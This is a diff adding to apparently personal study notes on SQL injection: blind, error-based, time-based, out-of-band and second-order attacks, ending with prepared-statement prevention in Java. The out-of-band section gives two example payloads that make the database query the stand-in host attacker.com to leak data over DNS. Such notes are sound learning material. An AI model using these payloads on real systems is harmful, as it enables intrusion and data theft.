@@ -247,3 +247,83 @@ MyDatabase     dbo           Users       Password     varchar
 
 BLIND SQL:
 - attacker cannot directly see the results of their queries. 
+Some ways attackers can still attack is by:
+- validating how it responds to truth statements, etc: 1 = 1, 1 = 2
+- Time based SQL Injection (verifying time delay functions)
+
+
+Error Based SQL:
+- Based on whether the program responds with an error according to the query, the attacker can determine whetehr the query succeded. 
+
+CAST:
+This technique leverages verbose SQL error messages to extract sensitive data from a database by intentionally causing type conversion errors.
+By using functions like CAST() to convert data to an incompatible type, an attacker can often force the database to return the actual value it attempted to convert,
+effectively making the data visible through the error message.
+
+
+This scenario describes the use of time-based blind SQL injection, a technique that exploits SQL injection vulnerabilities by introducing time delays to infer information. Even when the application handles database errors gracefully and does not visibly reflect query results, the execution time of the query can serve as a signal for attackers to determine whether a condition is true or false.
+
+How Time-Based Blind SQL Injection Works
+SQL Queries Are Synchronous:
+
+SQL queries are executed synchronously, meaning the application waits for the query to complete before responding to the user.
+If a query introduces a delay (e.g., using SQL functions like SLEEP()), the application's HTTP response time also increases.
+Injected Delays Reveal Information:
+
+Attackers can inject conditions that cause delays only if the condition is true.
+By measuring the time it takes for the application to respond, attackers can infer whether the condition is true or false.
+
+
+When SQL attacks are processed asynchronously:
+- the query is processed in a separate thread
+- use Out of band interactions
+
+
+Using DNS for OOB SQL Injection:
+
+DNS is commonly used for OOB attacks because most production networks allow outgoing DNS queries.
+Attackers use a domain they control (e.g., attacker.com) to capture DNS lookups triggered by the payload.
+How It Works:
+
+Inject a SQL payload that causes the database server to perform a DNS query to a domain controlled by the attacker.
+For example:
+sql
+Copy code
+' OR (SELECT LENGTH(database())) INTO OUTFILE '\\attacker.com\'--
+The database server performs a DNS lookup for attacker.com to resolve the domain name.
+The attacker monitors their DNS server and captures the request, confirming the payload was executed.
+
+2. Conditional Data Exfiltration
+Once the vulnerability is confirmed, you can exfiltrate data by embedding it in the domain name of the DNS request.
+
+Example:
+sql
+Copy code
+' OR IF(LENGTH(database())=6, LOAD_FILE('\\\\6.attacker.com\\'), LOAD_FILE('\\\\no6.attacker.com\\'))--
+If the database name is 6 characters long, the server queries 6.attacker.com.
+If not, it queries no6.attacker.com.
+The attacker observes the DNS request and deduces whether the condition is true.
+
+
+Second-Order SQL Injection
+Occurs when:
+
+User Input is Stored: The application saves user input (e.g., in a database) during one request.
+Stored Input is Later Used Unsafely: The application retrieves and incorporates the stored input into a SQL query in another context, without proper sanitization.
+The vulnerability does not manifest when the data is initially stored. Instead, it is triggered later when the data is retrieved and used unsafely.
+
+How to prevent SQL injection
+You can prevent most instances of SQL injection using parameterized queries instead of string concatenation within the query. These parameterized queries are also know as "prepared statements".
+
+The following code is vulnerable to SQL injection because the user input is concatenated directly into the query:
+
+String query = "SELECT * FROM products WHERE category = '"+ input + "'";
+Statement statement = connection.createStatement();
+ResultSet resultSet = statement.executeQuery(query);
+You can rewrite this code in a way that prevents the user input from interfering with the query structure:
+
+PreparedStatement statement = connection.prepareStatement("SELECT * FROM products WHERE category = ?");
+statement.setString(1, input);
+ResultSet resultSet = statement.executeQuery();
+
+
